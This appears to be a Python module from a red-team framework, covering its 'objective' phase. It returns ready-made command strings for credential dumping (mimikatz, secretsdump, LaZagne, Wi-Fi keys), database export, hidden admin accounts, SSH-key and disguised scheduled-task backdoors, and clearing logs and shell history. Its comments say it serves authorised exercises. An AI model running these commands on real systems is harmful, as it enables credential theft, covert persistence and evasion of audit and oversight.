# -*- coding: utf-8 -*-
"""
red_objective_phase.py — 红队阶段6：目标达成。

功能:
    - 数据窃取模拟（文件收集 / 数据库导出 / 凭证导出）
    - 权限维持（后门 / 隐藏账户 / 计划任务）
    - 痕迹清理（日志清理 / 文件删除）
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class ObjectiveResult:
    module: str = ""
    target: str = ""
    action: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    items: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {"module": self.module, "target": self.target,
                "action": self.action, "details": self.details,
                "item_count": len(self.items),
                "items": self.items[:50], "error": self.error}


class RedObjectivePhase:
    """红队阶段6：目标达成。"""

    # ------------------------------------------------------------------ #
    # 数据窃取模拟
    # ------------------------------------------------------------------ #
    def file_collect(self, paths: Optional[List[str]] = None
                     ) -> ObjectiveResult:
        paths = paths or [
            "C:\\Users\\*\\Desktop\\*.docx",
            "C:\\Users\\*\\Documents\\*.pdf",
            "/etc/passwd", "/etc/shadow",
        ]
        r = ObjectiveResult(module="exfil", action="file_collect")
        for p in paths:
            r.items.append({"path": p, "size_estimate": "N/A",
                            "note": "框架性收集（不实际读取敏感文件）"})
        return r

    def db_dump(self, db_type: str = "mssql", host: str = "",
                user: str = "", password: str = "") -> ObjectiveResult:
        r = ObjectiveResult(module="exfil", action="db_dump",
                           target=host)
        cmds = {
            "mssql": f"sqlcmd -S {host} -U {user} -P {password} -Q "
                     f"\"SELECT name FROM master..sysdatabases\"",
            "mysql": f"mysqldump -h {host} -u {user} -p --all-databases",
            "postgres": f"pg_dump -h {host} -U {user} all",
        }
        r.details["command"] = cmds.get(db_type, "未知数据库类型")
        r.details["db_type"] = db_type
        r.error = "框架就绪：实际导出需授权目标。"
        return r

    def cred_export(self) -> ObjectiveResult:
        r = ObjectiveResult(module="exfil", action="cred_export")
        r.items = [
            {"source": "lsass", "tool": "mimikatz sekurlsa::logonpasswords",
             "note": "内存凭据"},
            {"source": "sam", "tool": "secretsdump.py",
             "note": "本地 SAM/NTDS"},
            {"source": "browser", "tool": "LaZagne",
             "note": "浏览器保存密码"},
            {"source": "wifi", "tool": "netsh wlan show profile key=clear",
             "note": "Windows WiFi"},
        ]
        return r

    # ------------------------------------------------------------------ #
    # 权限维持
    # ------------------------------------------------------------------ #
    def backdoor_install(self, kind: str = "ssh_key",
                         user: str = "root") -> ObjectiveResult:
        r = ObjectiveResult(module="persist", action=f"backdoor_{kind}")
        cmds = {
            "ssh_key": f"mkdir -p ~{user}/.ssh && echo "
                       f"'<pubkey>' >> ~{user}/.ssh/authorized_keys",
            "hidden_account": "net user admin$ P@ss /add && "
                              "net localgroup administrators admin$ /add",
            "scheduled_task": "schtasks /create /tn \"WinUpdate\" "
                              "/tr \"C:\\bd.exe\" /sc minute /mo 5",
        }
        r.details["command"] = cmds.get(kind, "未知后门类型")
        r.error = "仅授权演练：不实际安装后门。"
        return r

    # ------------------------------------------------------------------ #
    # 痕迹清理
    # ------------------------------------------------------------------ #
    def log_clean(self, os_type: str = "windows") -> ObjectiveResult:
        r = ObjectiveResult(module="cleanup", action="log_clean")
        if os_type == "windows":
            r.items = [
                {"target": "Windows 事件日志",
                 "cmd": "wevtutil cl System; wevtutil cl Security"},
                {"target": "PowerShell 历史",
                 "cmd": "Remove-Item $env:APPDATA\\Microsoft\\Windows"
                        "\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"},
            ]
        else:
            r.items = [
                {"target": "bash 历史", "cmd": "history -c; rm ~/.bash_history"},
                {"target": "syslog", "cmd": "echo > /var/log/syslog"},
            ]
        r.error = "框架：红队演练结束应在授权范围内清理。"
        return r

    def file_erase(self, paths: Optional[List[str]] = None
                   ) -> ObjectiveResult:
        paths = paths or ["C:\\Windows\\Temp\\*.tmp", "/tmp/*.tmp"]
        r = ObjectiveResult(module="cleanup", action="file_erase")
        for p in paths:
            r.items.append({"path": p, "cmd": f"del /f /q {p}"})
        return r

    # ------------------------------------------------------------------ #
    def tool_status(self) -> Dict[str, Any]:
        return {
            "exfil_modules": ["file_collect", "db_dump", "cred_export"],
            "persist_modules": ["ssh_key", "hidden_account",
                                "scheduled_task"],
            "cleanup_modules": ["log_clean", "file_erase"],
            "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        }


_default: Optional[RedObjectivePhase] = None


def get_red_objective_phase() -> RedObjectivePhase:
    global _default
    if _default is None:
        _default = RedObjectivePhase()
    return _default
